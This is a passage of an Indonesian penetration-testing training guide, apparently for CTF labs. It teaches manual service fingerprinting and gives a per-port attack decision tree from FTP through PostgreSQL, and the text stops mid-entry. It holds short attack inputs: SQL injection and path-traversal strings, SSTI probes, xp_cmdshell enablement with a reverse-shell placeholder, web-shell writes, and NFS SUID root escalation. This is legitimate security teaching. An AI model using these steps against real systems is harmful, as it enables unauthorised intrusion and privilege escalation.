---
id: "04"
title: "04. Service Identification & Master Decision Tree — Pentest GPS Navigator"
category: "1. Fondasi"
categoryId: "fondasi"
filename: "04_service_identification_decision_tree.md"
refs_out: ["03","05","06","07","08","09","10","11","12","13","14a","14b","14c","14d","15","16","23","25","26","30","32","35","42","44","45","59","63"]
refs_in: ["03","06","09","10"]
---

# 04. Service Identification & Master Decision Tree — Pentest GPS Navigator

---

## 🎯 Pendahuluan & Peran Dokumen

Setelah menyelesaikan pemindaian jaringan pada modul terdahulu ([03. Nmap Master Workflow & Network Scanning — Panduan Komprehensif](/docs/nmap-master)), Anda kini memiliki daftar port terbuka (*open ports*) dan banner service awal.

Namun, banyak pemula terhenti di fase ini dan bingung: **"Saya punya 5 port terbuka... Ke mana saya harus melangkah selanjutnya? Port mana yang harus diserang lebih dulu?"**

Dokumen ini adalah **GPS Navigator Pentesting** Anda. Modul ini mengajarkan cara memvalidasi service yang sebenarnya berjalan (*manual banner grabbing*), membedah decision tree untuk 37+ protokol jaringan, menganalisis 8 skenario kombinasi multi-port di lab CTF, melakukan riset CVE/Exploit secara aman, serta menyediakan script otomasi recon terintegrasi.

Seluruh rujukan modul di dalam panduan ini telah diselaraskan 100% dengan master roadmap kurikulum 65 workflow pentesting Anda.

---

## 🧭 Bagian 1: Konsep Service Identification

```text
+=============================================================================+
|                      PORT NUMBER VS ACTUAL SERVICE                          |
+=============================================================================+
|                                                                             |
|   [ ASUMSI KELIRU PEMULA ]                                                  |
|   Port 22  == PASTI SSH                                                     |
|   Port 80  == PASTI HTTP Web Server                                         |
|   Port 443 == PASTI HTTPS Web Server                                        |
|                                                                             |
|   [ REALITA DI DUNIA CTF & ENTERPRISE ]                                     |
|   Port 2222 ──> Daemon OpenSSH 8.2p1 (SSH dipindah ke port non-standard)    |
|   Port 80   ──> Nginx Reverse Proxy / Cloudflare WAF (Bukan origin server)  |
|   Port 9001 ──> Python Custom Socket Server / Raw Backdoor                  |
|   Port 445  ──> Dibalik Firewall hanya merespon Drop (Filtered)             |
|                                                                             |
|   KESIMPULAN: "Nomor Port Hanyalah Angka. Banner Menentukan Realitas!"      |
+=============================================================================+
```

### 1.1 Perbedaan Port Number vs Service Sebenarnya

Di protokol TCP/IP, nomor port (1–65535) hanyalah konvensi standar IANA. Siapa pun dapat menjalankan service apa pun pada port apa pun:
* Server HTTP sering dijalankan di port 8080, 8000, 8888, 3000, 5000, atau bahkan 9001.
* Server SSH sering dipindahkan ke port 2222 atau 22022 untuk menghindari noise automated bot scanning.
* Port 80 bisa saja bukan web server, melainkan custom socket binary challenge (PWN).

> [!IMPORTANT]
> **Golden Rule**: Jangan pernah mempercayai nomor port secara membabi buta. Selalu lakukan **Service Fingerprinting** dan **Banner Grabbing** untuk memastikan protokol komunikasi yang sebenarnya.

---

### 1.2 Kenapa Banner Grabbing Manual Sangat Penting?

Meskipun Nmap memiliki flag `-sV`, banner grabbing manual menggunakan tool seperti `nc`, `curl`, atau `telnet` tetap wajib dikuasai karena:
1. **Nmap Mengirim Probe Standar**: Jika service kustom membutuhkan urutan handshake tertentu (*magic bytes*), Nmap akan menandainya sebagai `unknown` atau `tcpwrapped`.
2. **Menghindari WAF/IDS Alert**: Nmap `-sV` mengirim puluhan signature probe dalam 1 detik. Banner grabbing manual hanya mengirim 1 koneksi bersih yang jauh lebih stealthy.
3. **Melihat Header Mentah (*Raw Headers*)**: Nmap sering kali memotong (*truncate*) string banner yang terlalu panjang. Manual grabbing menampilkan header kustom (`X-Backend-Server`, `X-Powered-By`, `Debug-Token`).

---

### 1.3 Konsep "Fingerprinting Confidence Level"

```text
+-------------------+---------------------------------------------------------+
| Tingkat Keyakinan | Karakteristik Output & Tindakan Pentester               |
+-------------------+---------------------------------------------------------+
| **HIGH (95-100%)**| Banner eksplisit: "Apache/2.4.41 (Ubuntu)", "vsftpd 2.3.4"|
|                   | └─> Tindakan: Langsung cari CVE spesifik & directory fuzz|
|                   |                                                         |
| **MEDIUM (50-80%)| Header umum: "Server: BaseHTTP/0.6 Python/3.8.5"        |
|                   | └─> Tindakan: Cek framework (Flask/Django/Tornado) manual|
|                   |                                                         |
| **LOW (< 50%)**   | Nmap: "tcpwrapped", "unknown service", "filtered"       |
|                   | └─> Tindakan: Lakukan manual probe (nc, raw HTTP, SSL)  |
+-------------------+---------------------------------------------------------+
```

---

### 1.4 WAF & Reverse Proxy Detection

Sebelum menyerang service web (Port 80/443), pastikan Anda tidak sedang berbicara dengan Reverse Proxy atau WAF (Cloudflare, ModSecurity, AWS CloudFront):

* **Sinyal WAF/Proxy di Output Nmap / HTTP Headers**:
  * Header `Server: cloudflare`, `Server: awselb/2.0`, `Server: AkamaiGHost`.
  * Header `X-Forwarded-For`, `Via: 1.1 vegur`, `CF-RAY: ...`.
  * Respon `403 Forbidden` atau `406 Not Acceptable` saat mengirim karakter kutip (`'`) atau tag script (`<script>`).
* **Dampak**: Serangan bruteforce atau SQLMap otomatis akan diblokir seketika jika Anda tidak menyetel rate-limiting atau bypass header.

---

## 🔬 Bagian 2: Banner Grabbing Manual

Berikut adalah 8 alat utama banner grabbing manual di **Parrot OS XFCE** Anda:

```text
+=============================================================================+
|                      MANUAL BANNER GRABBING TOOLKIT                         |
+=============================================================================+
```

### 2.1 Netcat (`nc`) — Raw TCP Banner Grab
* **Kapan Digunakan**: Langkah pertama untuk setiap port TCP non-web (FTP, SSH, SMTP, POP3, Custom Socket).
* **Perintah**:
```bash
# Menghubungkan ke port dengan mode verbose dan timeout 3 detik
nc -vn -w 3 $TARGET 21
# KENAPA: '-v' (verbose) konfirmasi koneksi, '-n' (no DNS), '-w 3' (timeout agar tidak hang jika server silent).
```
* **Contoh Output Nyata**:
```text
(UNKNOWN) [10.10.11.205] 21 (ftp) open
220 (vsFTPd 3.0.3)
```
* **Cara Membaca**: Server langsung menyapa dengan banner `vsFTPd 3.0.3`. Kita tahu ini Linux FTP server.

---

### 2.2 `curl -I` & `curl -v` — Raw HTTP Header Probe
* **Kapan Digunakan**: Mengambil response header dari web server tanpa mengunduh seluruh isi halaman HTML.
* **Perintah**:
```bash
# 1. Mengambil HTTP Header saja
curl -I http://$TARGET/

# 2. Mengambil Header + Proses TCP/TLS Handshake Lengkap
curl -v -k http://$TARGET/
# KENAPA: '-I' meminta HEAD request, '-v' menampilkan request & response headers, '-k' abaikan validasi SSL cert.
```
* **Contoh Output Nyata**:
```text
HTTP/1.1 200 OK
Date: Wed, 02 Sep 2026 06:10:00 GMT
Server: Apache/2.4.50 (Unix) OpenSSL/1.1.1d
X-Powered-By: PHP/7.4.21
Set-Cookie: PHPSESSID=d9a8fbc76e812; path=/; HttpOnly
```
* **Cara Membaca**:
  * Web Server: `Apache/2.4.50` (Rentan terhadap Path Traversal CVE-2021-42013).
  * Backend: `PHP/7.4.21`.
  * Session Cookie: `PHPSESSID`.

---

### 2.3 `telnet` — Interactive Protocol Probing
* **Kapan Digunakan**: Berinteraksi interaktif dengan mail server (SMTP port 25, POP3 port 110, IMAP port 143).
* **Perintah**:
```bash
telnet $TARGET 25
```
* **Contoh Output Nyata**:
```text
Trying 10.10.11.205...
Connected to 10.10.11.205.
Escape character is '^]'.
220 mail.corp.htb ESMTP Postfix (Ubuntu)
EHLO attacker.htb
250-mail.corp.htb
250-PIPELINING
250-SIZE 10240000
250-VRFY
250 8BITMIME
```
* **Cara Membaca**: Server mendukung perintah `VRFY` (artinya kita bisa enumerasi validitas username email).

---

### 2.4 `openssl s_client` — SSL/TLS Inspection
* **Kapan Digunakan**: Memeriksa port HTTPS (443, 8443) atau port terenkripsi (IMAPS 993, SMTPS 465) untuk mengekstrak sertifikat SSL dan Virtual Hosts.
* **Perintah**:
```bash
openssl s_client -connect $TARGET:443 -servername $TARGET </dev/null 2>/dev/null | openssl x509 -noout -text | grep -iE "subject:|dns:"
```
* **Contoh Output Nyata**:
```text
        Subject: C = US, ST = CA, O = MegaCorp, CN = portal.megacorp.htb
                DNS:portal.megacorp.htb, DNS:vpn.megacorp.htb, DNS:git.megacorp.htb
```
* **Cara Membaca**: Menemukan 3 domain internal (`portal.megacorp.htb`, `vpn.megacorp.htb`, `git.megacorp.htb`) yang wajib didaftarkan ke `/etc/hosts`.

---

### 2.5 `whatweb` — Advanced Web Fingerprinting
* **Kapan Digunakan**: Otomasi fingerprinting teknologi web, CMS, plugin, embedded script, dan server headers.
* **Perintah**:
```bash
whatweb -a 3 http://$TARGET/
# KENAPA: '-a 3' (Aggressive mode) mengirim serangkaian probe untuk mendeteksi CMS & library JS.
```
* **Contoh Output Nyata**:
```text
http://10.10.11.205/ [200 OK] Apache[2.4.41], Bootstrap[4.5.0], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.205], JQuery[3.5.1], Title[Inlane Freight], WordPress[5.8.1]
```

---

### 2.6 `wafw00f` — Dedicated WAF Detection
* **Kapan Digunakan**: Sebelum menjalankan scanning agresif (FFUF / SQLMap) untuk memastikan tidak ada Web Application Firewall yang memblokir IP kita.
* **Perintah**:
```bash
wafw00f http://$TARGET/
```
* **Contoh Output Nyata**:
```text
[*] Checking http://10.10.11.205/
[+] The site http://10.10.11.205/ is behind Cloudflare (Cloudflare Inc.) WAF.
[~] Number of requests: 7
```

---

### 2.7 `webanalyze` (Wappalyzer CLI) — Rapid Tech Stack Detector
* **Kapan Digunakan**: Alternatif CLI super cepat berbasis Go untuk mendeteksi ribuan signature framework web.
* **Perintah**:
```bash
webanalyze -host http://$TARGET/ -crawl 1
```

---

## 🌳 Bagian 3: Master Decision Tree (37+ Services)

Gunakan struktur peta navigasi ini untuk menentukan arah tindakan pada setiap port yang Anda temukan:

```text
+=============================================================================+
|                          MASTER PROTOCOL DECISION TREE                      |
+=============================================================================+
```

---

### 3.1 FTP (Port 21) & FTPS (Port 990)
* **Pertanyaan Utama**: *"Apakah server mengizinkan login Anonymous dan apakah ada izin upload file?"*
* **Tool Validasi**: `ftp $TARGET` atau `nmap --script ftp-anon,ftp-syst -p 21 $TARGET`
```text
[ PORT 21: FTP ]
   │
   ├── [Q1: Anonymous Login Diizinkan?]
   │      ├── YES ──> Masuk dengan user 'anonymous' / pass 'anonymous'
   │      │            ├── Cek file tersembunyi (ls -la) -> Unduh backup/config/id_rsa
   │      │            └── [Q: Ada hak Write/Upload?]
   │      │                   ├── YES ──> Upload Web Shell (jika web root sama)
   │      │                   └── NO  ──> Loot file yang ada
   │      └── NO  ──> Lanjut ke Q2
   │
   └── [Q2: Versi Memiliki Exploit Publik?]
          ├── vsftpd 2.3.4  ──> Exploit Backdoor: msf (exploit/unix/ftp/vsftpd_234_backdoor)
          ├── ProFTPD 1.3.5 ──> Exploit Mod_Copy (CVE-2015-3306) salin file ke webroot
          └── Versi Lain    ──> Simpan untuk password spraying jika user sudah ditemukan
   │
   └── 📁 NEXT WORKFLOW: [07. FTP & FTPS Exploitation Workflow — Master Field Guide](/docs/ftp)
```

---

### 3.2 SSH (Port 22)
* **Pertanyaan Utama**: *"Apakah saya sudah memiliki username + password atau private key `id_rsa`?"*
* **Tool Validasi**: `ssh -v user@$TARGET` atau `hydra -l user -P rockyou.txt ssh://$TARGET`
```text
[ PORT 22: SSH ]
   │
   ├── [Q1: Kredensial / Key Sudah Ditemukan dari Web/FTP/SMB?]
   │      ├── YES (Password) ──> ssh user@$TARGET (atau ssh -oHostKeyAlgorithms=+ssh-rsa)
   │      ├── YES (id_rsa)   ──> chmod 600 id_rsa && ssh -i id_rsa user@$TARGET
   │      │                       └── [Q: Key ber-passphrase?] -> ssh2john id_rsa > h.txt && john h.txt
   │      └── NO ──> Lanjut ke Q2
   │
   └── [Q2: Versi OpenSSH Sangat Usang (< 7.7)?]
          ├── YES ──> Lakukan User Enumeration (CVE-2018-15473) via python script
          └── NO  ──> JANGAN BUANG WAKTU BRUTEFORCE! Tinggalkan SSH, kembali ke Web/SMB
   │
   └── 📁 NEXT WORKFLOW: [06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh)
```

---

### 3.3 Telnet (Port 23)
* **Pertanyaan Utama**: *"Apakah login banner membocorkan username default atau unauthenticated root shell?"*
* **Tool Validasi**: `telnet $TARGET`
```text
[ PORT 23: TELNET ]
   │
   ├── [Q1: Prompt Menampilkan Shell Langsung Tanpa Password?]
   │      ├── YES ──> ROOT/USER ACCESS LANGSUNG! ──> 📁 NEXT: [🐧 44 — Linux Privilege Escalation Workflow](/docs/linux-privesc)
   │      └── NO  ──> Coba default creds (admin:admin, root:root). Jika gagal ──> Cari creds di Web/SMB/FTP
   └── 📁 NEXT WORKFLOW: [06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh) / [🐧 44 — Linux Privilege Escalation Workflow](/docs/linux-privesc)
```

---

### 3.4 SMTP (Port 25) & SMTPS (Port 465) / Submission (Port 587)
* **Pertanyaan Utama**: *"Apakah server rentan terhadap User Enumeration (VRFY/EXPN) atau Open Relay?"*
* **Tool Validasi**: `smtp-user-enum -M VRFY -U users.txt -t $TARGET` atau `nc -vn $TARGET 25`
```text
[ PORT 25: SMTP ]
   │
   ├── [Q1: Perintah VRFY / EXPN / RCPT TO Diizinkan?]
   │      ├── YES ──> Jalankan smtp-user-enum untuk validasi daftar username valid
   │      └── NO  ──> Lanjut ke Q2
   └── [Q2: Server adalah Open Relay?]
          ├── YES ──> Kirim spoofed email phishing / internal notification
          └── NO  ──> Simpan daftar user yang ditemukan untuk password spray
   └── 📁 NEXT WORKFLOW: [08. SMTP Exploitation & User Enumeration Workflow — Master Field Guide](/docs/smtp)
```

---

### 3.5 DNS (Port 53 UDP/TCP)
* **Pertanyaan Utama**: *"Apakah DNS Server mengizinkan AXFR (Zone Transfer) atau membocorkan subdomain internal?"*
* **Tool Validasi**: `dig axfr @$TARGET domain.htb` atau `fierce --domain domain.htb --dns-servers $TARGET`
```text
[ PORT 53: DNS ]
   │
   ├── [Q1: Zone Transfer (AXFR) Berhasil?]
   │      ├── YES ──> Seluruh subdomain & IP internal terekspos seketika! Tambah ke /etc/hosts
   │      └── NO  ──> Lakukan brute-force subdomain via gobuster dns / ffuf
   └── 📁 NEXT WORKFLOW: [09. DNS Enumeration & Reconnaissance Workflow — Master Field Guide](/docs/dns)
```

---

### 3.6 TFTP (Port 69 UDP)
* **Pertanyaan Utama**: *"Bisakah kita mengunduh file sistem tanpa autentikasi?"*
* **Tool Validasi**: `tftp $TARGET` (TFTP tidak mendukung perintah `dir`/`ls`, harus tahu nama file!)
```text
[ PORT 69: TFTP ]
   │
   └── Coba unduh file umum: get /etc/passwd, get startup-config, get id_rsa
          ├── BERHASIL ──> Ekstrak kredensial / password hash
          └── GAGAL    ──> Fuzzing nama file menggunakan wordlist tftp di SecLists
   └── 📁 NEXT WORKFLOW: [07. FTP & FTPS Exploitation Workflow — Master Field Guide](/docs/ftp)
```

---

### 3.7 Finger (Port 79)
* **Pertanyaan Utama**: *"Apakah daemon Finger mengembalikan informasi user aktif dan home directory?"*
* **Tool Validasi**: `finger @$TARGET` atau `finger admin@$TARGET`
```text
[ PORT 79: FINGER ]
   │
   └── Jalankan enumerasi user: finger-user-enum -U /usr/share/seclists/... -t $TARGET
          └── Dapatkan daftar username riil sistem ──> Gunakan untuk spray di SSH/FTP/Web
   └── 📁 NEXT WORKFLOW: [06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh) / [⚡ Quick Start: Urutan Kerja Password Cracking (Untuk Pemula)](/docs/password-cracking)
```

---

### 3.8 HTTP (Port 80) & HTTPS (Port 443)
* **Pertanyaan Utama**: *"Teknologi apa yang berjalan, direktori apa yang tersembunyi, dan di mana titik input pengguna?"*
* **Tool Validasi**: Browser, `whatweb`, `ffuf`, Burp Suite.
```text
[ PORT 80 / 443: WEB ]
   │
   ├── [Langkah 1: Inspeksi Permukaan] ──> Buka Browser, Cek Source Code (Ctrl+U), Cek /robots.txt
   ├── [Langkah 2: VHost Enumeration]  ──> ffuf -u http://$TARGET -H "Host: FUZZ.domain.htb" -w vhosts.txt
   ├── [Langkah 3: Directory Fuzzing]  ──> ffuf -u http://$TARGET/FUZZ -w raft-medium-words.txt -e .php,.txt,.bak
   └── [Langkah 4: Analisis Vektor Celah]:
          ├── Form Login       ──> SQL Injection (' or 1=1--), Default Creds, Password Reset Flaw
          ├── File Upload Form ──> Upload Web Shell, Bypass Content-Type / Magic Bytes / Extension
          ├── URL Parameter    ──> LFI/RFI (?page=../../../../etc/passwd), SSRF (?url=http://127.0.0.1)
          └── CMS Terdeteksi   ──> WordPress (17a), Joomla (17b), Drupal (17c)
   │
   └── 📁 NEXT WORKFLOW: [15. Web Reconnaissance & Enumeration Workflow — Master Field Guide](/docs/web-recon) & [16. Directory & Virtual Host (VHost) Fuzzing Workflow — Master Field Guide](/docs/directory-vhost-fuzzing)
```

---

### 3.9 POP3 (Port 110/995) & IMAP (Port 143/993)
* **Pertanyaan Utama**: *"Bisakah kita login ke inbox mailbox user untuk membaca email berisi password/token konfirmasi?"*
* **Tool Validasi**: `nc -vn $TARGET 110` (POP3) atau `openssl s_client -connect $TARGET:993` (IMAPS)
```text
[ PORT 110/143: MAIL ]
   │
   └── Login dengan kredensial yang didapat:
          ├── POP3: USER <username> ➔ PASS <password> ➔ STAT ➔ RETR 1
          └── IMAP: a1 LOGIN <user> <pass> ➔ a2 SELECT INBOX ➔ a3 FETCH 1 BODY[]
          └── Cari email berisi password reset link, invoice PDF, atau kredensial internal
   └── 📁 NEXT WORKFLOW: [08. SMTP Exploitation & User Enumeration Workflow — Master Field Guide](/docs/smtp)
```

---

### 3.10 RPC / Portmapper (Port 111)
* **Pertanyaan Utama**: *"Layanan RPC apa yang terdaftar (NFS, NIS, Status)?"*
* **Tool Validasi**: `rpcinfo -p $TARGET`
```text
[ PORT 111: RPC ]
   │
   └── Periksa output rpcinfo:
          ├── Program 100003 (nfs) aktif?   ──> Lanjut ke enumerasi NFS (Port 2049)
          ├── Program 100005 (mountd) aktif? ──> Jalankan showmount -e $TARGET
          └── Program 100024 (status) aktif? ──> Cek versi untuk DoS/RCE rpc.statd
   └── 📁 NEXT WORKFLOW: [13. NFS Exploitation & Network File System Workflow — Master Field Guide](/docs/nfs)
```

---

### 3.11 NetBIOS (Port 139) & SMB (Port 445)
* **Pertanyaan Utama**: *"Apakah ada Null Session / Anonymous Share dan apakah sistem rentan terhadap exploit EternalBlue/ZeroLogon?"*
* **Tool Validasi**: `smbclient -N -L //$TARGET/`, `nxc smb $TARGET`, `enum4linux-ng -A $TARGET`
```text
[ PORT 139 / 445: SMB ]
   │
   ├── [Q1: Null Session / Anonymous Login Diizinkan?]
   │      ├── YES ──> smbclient //$TARGET/<share_name> -N
   │      │            └── Download file backup, .kdbx, config.json, SAM/SYSTEM dump
   │      └── NO  ──> Lanjut ke Q2
   │
   ├── [Q2: Sistem Memiliki Exploit Pre-Auth Kritis?]
   │      ├── Windows 7 / 2008 ──> Cek MS17-010 (EternalBlue)
   │      ├── Windows Server 2019/2022 ──> Cek SMBGhost (CVE-2020-0796) atau ZeroLogon (Port 445+135)
   │      └── Linux Samba 3.X  ──> Cek SambaCry (CVE-2017-7494)
   │
   └── [Q3: Kredensial Valid Ditemukan?]
          ├── Admin Kredensial ──> Eksekusi shell via psexec.py / wmiexec.py / smbexec.py
          └── User Biasa       ──> Enum Domain Users & Password Spraying via nxc smb
   │
   └── 📁 NEXT WORKFLOW: [05. SMB & Samba Exploitation Workflow — Master Field Guide](/docs/smb-samba)
```

---

### 3.12 SNMP (Port 161 UDP)
* **Pertanyaan Utama**: *"Berapa SNMP Community String (public/private) dan informasi apa yang bisa di-dump?"*
* **Tool Validasi**: `onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $TARGET`
```text
[ PORT 161: SNMP ]
   │
   ├── [Q1: Community String Valid Ditemukan (misal: 'public')?]
   │      ├── YES ──> Jalankan snmpwalk -v2c -c public $TARGET
   │      │            ├── Dump Running Processes: snmpwalk ... 1.3.6.1.2.1.25.4.2.1.2
   │      │            ├── Dump User Accounts: snmpwalk ... 1.3.6.1.4.1.77.1.2.25
   │      │            ├── Dump Network Interfaces: snmpwalk ... 1.3.6.1.2.1.2.2.1.2
   │      │            └── Gunakan snmp-check $TARGET untuk laporan otomatis
   │      └── NO  ──> Coba wordlist community string yang lebih besar
   └── 📁 NEXT WORKFLOW: [10. SNMP Enumeration & Information Gathering Workflow — Master Field Guide](/docs/snmp)
```

---

### 3.13 LDAP (Port 389) & LDAPS (Port 636)
* **Pertanyaan Utama**: *"Apakah LDAP mengizinkan Anonymous Bind untuk membaca seluruh data Active Directory?"*
* **Tool Validasi**: `ldapsearch -x -H ldap://$TARGET -b "DC=domain,DC=local"`
```text
[ PORT 389 / 636: LDAP ]
   │
   ├── [Q1: Anonymous Bind Berhasil?]
   │      ├── YES ──> Dump seluruh User, Group, Description (sering ada password di field description!)
   │      └── NO  ──> Tunggu sampai punya 1 user credentials, lalu jalankan bloodhound-python
   └── 📁 NEXT WORKFLOW: [<a href="/docs/ldap" class="text-[#00b4d8] hover:underline font-mono font-semibold">11_ldap_workflow.md</a> — Pentest Workflow: LDAP & Active Directory Enumeration](/docs/ldap) & [🏰 35 — Active Directory Initial Enumeration Workflow](/docs/ad-initial-enumeration)
```

---

### 3.14 R-Services: Rexec (512), Rlogin (513), Rsh (514)
* **Pertanyaan Utama**: *"Apakah konfigurasi `.rhosts` memperbolehkan eksekusi perintah jarak jauh tanpa password?"*
* **Tool Validasi**: `rlogin -l root $TARGET` atau `rsh -l root $TARGET id`
```text
[ PORT 512/513/514: R-SERVICES ]
   │
   └── Coba eksekusi perintah: rsh -l root $TARGET "id; uname -a"
          ├── Berhasil ──> LANGSUNG DAPAT ROOT ACCESS!
          └── Gagal    ──> Coba username lain (daemon, bin, sys, adm)
   └── 📁 NEXT WORKFLOW: [🐧 44 — Linux Privilege Escalation Workflow](/docs/linux-privesc)
```

---

### 3.15 Rsync (Port 873)
* **Pertanyaan Utama**: *"Apakah rsync module terbuka tanpa password dan bisa dibaca/ditulis?"*
* **Tool Validasi**: `rsync --list-only rsync://$TARGET/`
```text
[ PORT 873: RSYNC ]
   │
   ├── [Q1: Modul Muncul Tanpa Password?]
   │      ├── YES ──> Unduh seluruh folder: rsync -av rsync://$TARGET/shared_folder/ ./loot/
   │      │            └── [Q: Ada hak write?] -> Upload SSH public key ke /home/user/.ssh/authorized_keys
   │      └── NO  ──> Bruteforce password rsync
   └── 📁 NEXT WORKFLOW: [13. NFS Exploitation & Network File System Workflow — Master Field Guide](/docs/nfs) / [🐧 44 — Linux Privilege Escalation Workflow](/docs/linux-privesc)
```

---

### 3.16 Microsoft SQL Server / MSSQL (Port 1433)
* **Pertanyaan Utama**: *"Bisakah login sebagai user `sa` dan mengaktifkan `xp_cmdshell` untuk RCE?"*
* **Tool Validasi**: `nxc mssql $TARGET -u sa -p 'password'` atau `impacket-mssqlclient sa@$TARGET`
```text
[ PORT 1433: MSSQL ]
   │
   ├── [Q1: Login Kredensial Berhasil?]
   │      ├── YES ──> Di dalam mssqlclient:
   │      │            ├── EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
   │      │            ├── EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
   │      │            └── xp_cmdshell "<reverse_shell_command>" (RCE SYSTEM!)
   │      └── NO  ──> Cari password SQL di file web / Kerberoasting (Port 88)
   └── 📁 NEXT WORKFLOW: [Pentest Workflow: Microsoft SQL Server (MSSQL) Exploitation](/docs/mssql)
```

---

### 3.17 Oracle Database (Port 1521)
* **Pertanyaan Utama**: *"Berapa SID database Oracle dan apakah default password `system:manager` atau `scott:tiger` aktif?"*
* **Tool Validasi**: `odat sidguesser -s $TARGET` ➔ `odat passwordguesser -s $TARGET -d <SID>`
```text
[ PORT 1521: ORACLE DB ]
   │
   └── Jalankan ODAT (Oracle Database Attacking Tool):
          ├── 1. Temukan valid SID (XE, ORCL, PROD)
          ├── 2. Bruteforce kredensial default
          └── 3. Eksekusi privilege escalation / Java OS command execution via ODAT
   └── 📁 NEXT WORKFLOW: [./14_database_workflow.md](./14_database_workflow.md)
```

---

### 3.18 NFS (Port 2049)
* **Pertanyaan Utama**: *"Folder apa yang diekspor dan apakah opsi `no_root_squash` aktif?"*
* **Tool Validasi**: `showmount -e $TARGET`
```text
[ PORT 2049: NFS ]
   │
   ├── [Langkah 1: Mount Folder] ──> sudo mount -t nfs -o nolock $TARGET:/folder /mnt/nfs
   └── [Langkah 2: Analisis Hak Akses]:
          ├── Terdapat home folder user? ──> Tulis SSH key ke /mnt/nfs/user/.ssh/authorized_keys
          └── Opsi no_root_squash aktif? ──> Copy shell binary lokal ke /mnt/nfs, pasang SUID (chmod +s),
                                            lalu eksekusi di target untuk INSTANT ROOT!
   └── 📁 NEXT WORKFLOW: [13. NFS Exploitation & Network File System Workflow — Master Field Guide](/docs/nfs)
```

---

### 3.19 Apache Zookeeper (Port 2181)
* **Pertanyaan Utama**: *"Apakah perintah 4-letter word Zookeeper terbuka tanpa auth?"*
* **Tool Validasi**: `echo envi | nc -vn $TARGET 2181` atau `echo dump | nc -vn $TARGET 2181`
```text
[ PORT 2181: ZOOKEEPER ]
   │
   └── Kirim 4-letter commands:
          ├── envi / conf ──> Dump environment variables (sering membocorkan secret keys/tokens)
          └── dump / cons ──> Dump connected clients dan session node
   └── 📁 NEXT WORKFLOW: [📦 BAGIAN 1: REDIS & NOSQL FUNDAMENTALS](/docs/redis-and-mongodb) / [🔌 30 — API Security Workflow](/docs/api-security)
```

---

### 3.20 Node.js / Grafana / Custom Web (Port 3000)
* **Pertanyaan Utama**: *"Apakah ini dashboard Grafana (CVE-2021-43798 Directory Traversal) atau custom Node.js Express API?"*
* **Tool Validasi**: Browser `http://$TARGET:3000/` atau `curl -I http://$TARGET:3000/`
```text
[ PORT 3000: NODE/GRAFANA ]
   │
   ├── Grafana Terdeteksi  ──> Cek versi (< 8.3.0 rentan LFI read /etc/passwd tanpa auth)
   └── Node.js API Backend ──> Fuzzing GraphQL (/graphql), Debug endpoint (/debug), NoSQL Injection
   └── 📁 NEXT WORKFLOW: [15. Web Reconnaissance & Enumeration Workflow — Master Field Guide](/docs/web-recon) & [🔌 30 — API Security Workflow](/docs/api-security)
```

---

### 3.21 MySQL & MariaDB (Port 3306)
* **Pertanyaan Utama**: *"Bisakah login remote user root tanpa password atau kredensial default?"*
* **Tool Validasi**: `mysql -h $TARGET -u root` atau `nxc mysql $TARGET -u root -p ''`
```text
[ PORT 3306: MYSQL ]
   │
   ├── [Q1: Remote Login Berhasil?]
   │      ├── YES ──> Dump database: SHOW DATABASES; USE app; SELECT * FROM users;
   │      │            └── [Q: Punya hak FILE?] -> Tulis web shell ke webroot via SELECT INTO OUTFILE
   │      └── NO  ──> Cari kredensial database di file konfigurasi web (wp-config.php, .env)
   └── 📁 NEXT WORKFLOW: [14a. MySQL & MariaDB Exploitation Workflow — Master Field Guide](/docs/mysql)
```

---

### 3.22 RDP / Remote Desktop (Port 3389)
* **Pertanyaan Utama**: *"Apakah Network Level Authentication (NLA) aktif, apakah rentan BlueKeep, atau bisakah login GUI?"*
* **Tool Validasi**:
```bash
# 1. Cek enkripsi & NLA status
nmap --script rdp-enum-encryption,rdp-vuln-ms12-020 -p 3389 $TARGET

# 2. Login GUI jika punya kredensial
xfreerdp /v:$TARGET /u:username /p:password /clipboard /dynamic-resolution
```
```text
[ PORT 3389: RDP ]
   │
   ├── [Q1: Windows 7 / Server 2008 (Legacy)?]
   │      ├── YES ──> Cek kerentanan BlueKeep (CVE-2019-0708) via Metasploit
   │      └── NO  ──> Lanjut ke Q2
   └── [Q2: Kredensial Valid Sudah Didapat?]
          ├── YES ──> Buka GUI Remote Desktop via xfreerdp
          └── NO  ──> Jangan bruteforce RDP (Sangat lambat & akun rawan terkunci / lockout)
   └── 📁 NEXT WORKFLOW: [12. RDP Exploitation & Remote Desktop Workflow — Master Field Guide](/docs/rdp)
```

---

### 3.23 Erlang Port Mapper Daemon / EPMD (Port 4369) & RabbitMQ
* **Pertanyaan Utama**: *"Apakah Erlang node memiliki default magic cookie (`ERLANG_COOKIE`)?"*
* **Tool Validasi**: `nmap --script epmd-info -p 4369 $TARGET`
```text
[ PORT 4369: ERLANG ]
   │
   └── Jika cookie bocor atau bruteforce cookie berhasil:
          └── Eksekusi RCE langsung via script erl_cookie_rce.py
   └── 📁 NEXT WORKFLOW: [🐧 44 — Linux Privilege Escalation Workflow](/docs/linux-privesc)
```

---

### 3.24 Python Flask / Werkzeug (Port 5000)
* **Pertanyaan Utama**: *"Apakah debug console Werkzeug aktif di `/console` atau aplikasi rentan SSTI Jinja2?"*
* **Tool Validasi**: Buka `http://$TARGET:5000/console` di browser
```text
[ PORT 5000: FLASK/WERKZEUG ]
   │
   ├── [Q1: Halaman /console Terbuka?]
   │      ├── YES ──> Cari PIN Werkzeug (via LFI baca MAC address & machine-id) ➔ RCE Instant!
   │      └── NO  ──> Lanjut ke Q2
   └── [Q2: Input Dirender ke Template?]
          └── Uji SSTI Payload: {{7*7}} ➔ Jika muncul 49, eksekusi SSTI OS Command Injection payload
   └── 📁 NEXT WORKFLOW: [15. Web Reconnaissance & Enumeration Workflow — Master Field Guide](/docs/web-recon) & [Workflow 23 â€” Server-Side Template Injection (SSTI)](/docs/ssti)
```

---

### 3.25 PostgreSQL (Port 5432)
* **Pertanyaan Utama**: *"Apakah default user `postgres:postgres` aktif dan bisakah RCE via `COPY PROGRAM`?"*
* **Tool Validasi**: `psql -h $TARGET -U postgres`
```text
[ PORT 5432: POSTGRESQL ]
   │
   └── Jika login berhasil sebagai superuser:
